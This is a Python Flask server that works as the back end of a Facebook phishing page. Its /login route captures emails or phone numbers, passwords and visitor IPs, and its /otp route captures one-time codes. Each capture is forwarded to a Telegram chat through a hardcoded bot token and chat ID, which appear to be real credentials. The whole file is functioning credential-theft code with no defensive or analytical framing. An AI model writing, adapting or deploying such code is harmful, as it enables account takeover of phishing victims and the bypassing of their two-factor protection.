from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = "8534441045:AAHsp17sqKpDC4TuPf52kF_gb7XrKoRtpKw"
TELEGRAM_CHAT_ID = "7994271654"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    requests.get(url, params={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"})

@app.route('/login', methods=['POST'])
def capture_login():
    email = request.form.get('email')
    password = request.form.get('pass')
    ip = request.remote_addr
    
    msg = f"""
🔥 <b>New Facebook Login Captured</b> 🔥
Email/Phone: <code>{email}</code>
Password: <code>{password}</code>
IP: {ip}
    """
    send_to_telegram(msg)
    return jsonify({"success": True})

@app.route('/otp', methods=['POST'])
def capture_otp():
    email = request.form.get('email')
    otp = request.form.get('otp')
    
    msg = f"""
✅ <b>OTP Code Captured</b> ✅
Email: <code>{email}</code>
OTP Code: <code>{otp}</code>
    """
    send_to_telegram(msg)
    return jsonify({"success": True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
